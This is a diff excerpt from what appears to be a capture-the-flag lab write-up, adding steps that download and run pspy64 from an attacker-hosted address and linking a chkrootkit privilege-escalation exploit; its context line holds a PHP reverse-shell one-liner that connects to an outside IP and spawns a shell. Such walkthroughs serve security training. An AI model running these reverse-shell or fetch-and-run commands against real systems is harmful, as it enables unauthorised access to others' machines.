@@ -147,3 +147,16 @@ php -r '$sock=fsockopen("10.10.14.25",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 ![image](https://user-images.githubusercontent.com/83878909/234601719-41e0eb4b-49ff-49a5-8ae4-898acc8d58cc.png)
 
 ![image](https://user-images.githubusercontent.com/83878909/234607621-64dbdecb-5d29-43ce-a0cf-0d7072cd3c55.png)
+
+  - Upload `pspy64`
+```CSS
+▶ wget http://10.10.14.12:5555/pspy64
+▶ chmod +x pspy64
+▶ ./pspy64
+```
+![image](https://user-images.githubusercontent.com/83878909/234611389-ee33c978-c1c2-4022-a3f6-7bb715338377.png)
+![image](https://user-images.githubusercontent.com/83878909/234611136-f13ee9a3-14b6-4b70-b39c-5d9c891e8d23.png)
+
+![image](https://user-images.githubusercontent.com/83878909/234613642-752c8e5c-3627-4b75-ac35-c4df4ae970c9.png)
+
+  - [chkrootkit Local Privilege Escalation](https://vk9-sec.com/chkrootkit-0-49-local-privilege-escalation-cve-2014-0476/)
